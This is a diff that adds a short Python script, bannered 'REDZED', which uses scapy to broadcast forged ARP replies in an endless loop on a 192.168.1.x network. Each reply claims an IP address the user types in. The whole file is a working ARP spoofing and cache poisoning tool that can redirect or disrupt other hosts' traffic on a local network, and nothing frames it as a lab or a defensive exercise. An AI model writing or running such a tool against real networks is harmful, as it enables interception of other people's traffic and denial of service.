@@ -1,0 +1,8 @@
+import os
+import scapy.all as scapy
+import random
+print("REDZED")
+ip=input("include host IP adress")
+while True:
+    scapy_packet=scapy.ARP(op=2,hwdst="ff:ff:ff:ff:ff:ff",psrc=ip,pdst="192.168.1.255")
+    scapy.send(scapy_packet)
